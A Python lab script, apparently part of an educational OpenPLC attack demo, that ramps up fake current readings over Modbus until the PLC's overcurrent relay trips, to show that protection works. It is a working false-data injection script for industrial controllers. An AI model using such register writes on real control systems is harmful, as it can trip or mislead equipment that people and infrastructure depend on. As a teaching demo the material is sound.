"""
attack_scripts/atk05_load_spike.py
─────────────────────────────────────────────────────────────
ATK-05: LOAD SPIKE INJECTION

Rapidly writes increasing current values to simulate a sudden
massive load being switched on. OpenPLC's overcurrent protection
relay SHOULD trip — demonstrating that protection works.

This is the "positive" attack scenario — shows the difference
between ATK-03 (relay bypassed, no protection) vs ATK-05
(relay active, protection works correctly).

Use this in your demo to show: "this is why the relay matters."
Educational Simulation Only.
"""

import time, sys, argparse
try:
    from pymodbus.client import ModbusTcpClient
except ImportError:
    from pymodbus.client.sync import ModbusTcpClient

def run_attack(host="127.0.0.1", port=502):
    print("=" * 55)
    print("  ATK-05: LOAD SPIKE INJECTION")
    print("  Target: Current register %IW0")
    print("  Effect: Overcurrent → relay trips → safe shutdown")
    print("  Expected: Protection relay WORKS correctly")
    print("  Educational simulation only.")
    print("=" * 55)

    client = ModbusTcpClient(host=host, port=port, timeout=3)
    if not client.connect():
        print(f"[!] Cannot connect to {host}:{port}"); sys.exit(1)

    print(f"\n[+] Connected — injecting current spike")
    print("    Relay threshold: 100A")
    print("    Expected trip:   within 1-2 ticks above threshold\n")

    tick = 0
    current = 600   # start at 60.0A

    try:
        while True:
            tick    += 1
            current  = min(current + 80, 1650)  # ramp up fast (×10 scale)

            client.write_registers(0, [current], slave=1)

            coils = client.read_coils(0, count=3, slave=1)
            if not coils.isError():
                breaker = "CLOSED" if coils.bits[0] else "OPEN"
                tripped = coils.bits[2]
                print(f"[tick {tick:02d}] Current={current/10:.1f}A | "
                      f"Breaker={breaker} | Tripped={tripped}")

                if not coils.bits[0]:   # breaker opened
                    print(f"\n[+] RELAY TRIPPED at {current/10:.1f}A ✔")
                    print("[+] Breaker opened — equipment protected")
                    print("[+] This is correct behaviour — contrast with ATK-03")
                    break

            if tick > 20:
                print("[!] Relay did not trip after 20 ticks — check PLC logic")
                break

            time.sleep(0.8)

    except KeyboardInterrupt:
        print("\n[!] Interrupted")
    finally:
        client.close()

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--host", default="127.0.0.1")
    parser.add_argument("--port", default=502, type=int)
    args = parser.parse_args()
    run_attack(args.host, args.port)
